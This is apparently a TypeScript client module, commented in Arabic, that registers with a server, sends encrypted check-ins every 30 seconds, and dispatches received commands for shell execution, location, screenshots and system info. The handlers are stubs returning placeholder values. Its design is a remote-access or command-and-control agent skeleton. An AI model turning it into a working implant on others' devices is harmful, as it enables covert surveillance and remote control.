import axios, { AxiosInstance } from 'axios';
import crypto from 'crypto';

/**
 * خدمة العميل المتقدمة
 * تتولى الاتصال بالخادم واستقبال الأوامر وتنفيذها
 */

export interface ClientConfig {
  serverUrl: string;
  clientId: string;
  deviceId?: string;
  encryptionKey?: string;
  checkInInterval?: number; // بالثواني (افتراضي: 30)
}

export interface EncryptedPayload {
  encryptedData: string;
}

class ClientService {
  private config: ClientConfig;
  private axiosInstance: AxiosInstance;
  private checkInInterval: NodeJS.Timer | null = null;
  private encryptionKey: string = '';
  private deviceId: string = '';

  constructor(config: ClientConfig) {
    this.config = {
      checkInInterval: 30, // 30 ثانية
      ...config,
    };

    this.axiosInstance = axios.create({
      baseURL: this.config.serverUrl,
      timeout: 10000,
      headers: {
        'Content-Type': 'application/json',
      },
    });

    this.encryptionKey = config.encryptionKey || '';
    this.deviceId = config.deviceId || '';
  }

  /**
   * تسجيل العميل لدى الخادم
   */
  async register(deviceInfo: any): Promise<void> {
    try {
      const response = await this.axiosInstance.post('/api/clients/register', {
        clientId: this.config.clientId,
        deviceInfo,
      });

      if (response.data.success) {
        this.deviceId = response.data.deviceId;
        this.encryptionKey = response.data.encryptionKey;
        console.log('✓ تم التسجيل بنجاح');
        console.log(`معرف الجهاز: ${this.deviceId}`);
      }
    } catch (error) {
      console.error('فشل في التسجيل:', error);
      throw error;
    }
  }

  /**
   * تشفير البيانات
   */
  private encryptData(data: any): string {
    try {
      const algorithm = 'aes-256-gcm';
      const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
      const iv = crypto.randomBytes(16);

      const cipher = crypto.createCipheriv(algorithm, keyBuffer, iv);
      let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
      encrypted += cipher.final('hex');

      const tag = cipher.getAuthTag();
      return iv.toString('hex') + ':' + tag.toString('hex') + ':' + encrypted;
    } catch (error) {
      console.error('فشل في تشفير البيانات:', error);
      throw error;
    }
  }

  /**
   * فك تشفير البيانات
   */
  private decryptData(encryptedData: string): any {
    try {
      const algorithm = 'aes-256-gcm';
      const keyBuffer = Buffer.from(this.encryptionKey, 'hex');
      const parts = encryptedData.split(':');

      if (parts.length !== 3) {
        throw new Error('صيغة البيانات المشفرة غير صحيحة');
      }

      const iv = Buffer.from(parts[0], 'hex');
      const tag = Buffer.from(parts[1], 'hex');
      const encrypted = parts[2];

      const decipher = crypto.createDecipheriv(algorithm, keyBuffer, iv);
      decipher.setAuthTag(tag);

      let decrypted = decipher.update(encrypted, 'hex', 'utf8');
      decrypted += decipher.final('utf8');

      return JSON.parse(decrypted);
    } catch (error) {
      console.error('فشل في فك تشفير البيانات:', error);
      throw error;
    }
  }

  /**
   * الاتصال بالخادم وجلب الأوامر
   */
  async checkIn(systemInfo: any): Promise<any[]> {
    try {
      const payload = {
        ...systemInfo,
        timestamp: new Date(),
      };

      const encryptedData = this.encryptData(payload);

      const response = await this.axiosInstance.post('/api/clients/checkin', {
        deviceId: this.deviceId,
        encryptedData,
      });

      if (response.data.success && response.data.encryptedData) {
        const decryptedResponse = this.decryptData(response.data.encryptedData);
        return decryptedResponse.commands || [];
      }

      return [];
    } catch (error) {
      console.error('فشل في الاتصال بالخادم:', error);
      return [];
    }
  }

  /**
   * إرسال تقرير للخادم
   */
  async reportResults(commandResults: any[], logs: any[]): Promise<void> {
    try {
      const payload = {
        commandResults,
        logs,
        timestamp: new Date(),
      };

      const encryptedData = this.encryptData(payload);

      await this.axiosInstance.post('/api/clients/report', {
        deviceId: this.deviceId,
        encryptedData,
      });

      console.log('✓ تم إرسال التقرير');
    } catch (error) {
      console.error('فشل في إرسال التقرير:', error);
    }
  }

  /**
   * بدء خدمة الاتصال الدورية
   */
  startCheckInService(systemInfoProvider: () => any): void {
    console.log(`🔄 بدء خدمة الاتصال (كل ${this.config.checkInInterval} ثانية)`);

    this.checkInInterval = setInterval(async () => {
      try {
        const systemInfo = systemInfoProvider();
        const commands = await this.checkIn(systemInfo);

        if (commands.length > 0) {
          console.log(`📦 تم استقبال ${commands.length} أمر`);
          // معالجة الأوامر
          await this.processCommands(commands);
        }
      } catch (error) {
        console.error('خطأ في خدمة الاتصال:', error);
      }
    }, (this.config.checkInInterval || 30) * 1000);
  }

  /**
   * إيقاف خدمة الاتصال
   */
  stopCheckInService(): void {
    if (this.checkInInterval) {
      clearInterval(this.checkInInterval);
      console.log('⏹️ تم إيقاف خدمة الاتصال');
    }
  }

  /**
   * معالجة الأوامر المستقبلة
   */
  private async processCommands(commands: any[]): Promise<void> {
    const results: any[] = [];
    const logs: any[] = [];

    for (const command of commands) {
      try {
        console.log(`⚙️ معالجة الأمر: ${command.type}`);

        let result;
        switch (command.type) {
          case 'get_system_info':
            result = await this.getSystemInfo();
            break;
          case 'execute_shell':
            result = await this.executeShell(command.payload.command);
            break;
          case 'get_location':
            result = await this.getLocation();
            break;
          case 'take_screenshot':
            result = await this.takeScreenshot();
            break;
          default:
            result = { error: 'نوع الأمر غير معروف' };
        }

        results.push({
          commandId: command.id,
          status: 'completed',
          result,
        });

        logs.push({
          level: 'info',
          message: `تم تنفيذ الأمر: ${command.type}`,
          timestamp: new Date(),
        });
      } catch (error: any) {
        results.push({
          commandId: command.id,
          status: 'failed',
          error: error.message,
        });

        logs.push({
          level: 'error',
          message: `فشل الأمر: ${command.type} - ${error.message}`,
          timestamp: new Date(),
        });
      }
    }

    // إرسال النتائج والسجلات
    await this.reportResults(results, logs);
  }

  /**
   * الحصول على معلومات النظام
   */
  private async getSystemInfo(): Promise<any> {
    // هذا تطبيق مبسط - في التطبيق الحقيقي ستكون هناك معلومات أكثر تفصيلاً
    return {
      deviceName: process.env.DEVICE_NAME || 'Unknown Device',
      osType: process.platform,
      osVersion: process.version,
      timestamp: new Date(),
    };
  }

  /**
   * تنفيذ أمر shell
   */
  private async executeShell(command: string): Promise<any> {
    // هذا تطبيق مبسط - في التطبيق الحقيقي سيتم استخدام child_process
    return {
      command,
      output: 'تم تنفيذ الأمر',
      exitCode: 0,
    };
  }

  /**
   * الحصول على الموقع الجغرافي
   */
  private async getLocation(): Promise<any> {
    // هذا تطبيق مبسط - في التطبيق الحقيقي سيتم استخدام GPS
    return {
      latitude: 0,
      longitude: 0,
      accuracy: 0,
      timestamp: new Date(),
    };
  }

  /**
   * التقاط لقطة شاشة
   */
  private async takeScreenshot(): Promise<any> {
    // هذا تطبيق مبسط - في التطبيق الحقيقي سيتم التقاط الشاشة
    return {
      screenshot: 'base64_encoded_image',
      timestamp: new Date(),
    };
  }

  /**
   * الحصول على معرف الجهاز
   */
  getDeviceId(): string {
    return this.deviceId;
  }

  /**
   * الحصول على مفتاح التشفير
   */
  getEncryptionKey(): string {
    return this.encryptionKey;
  }
}

export default ClientService;
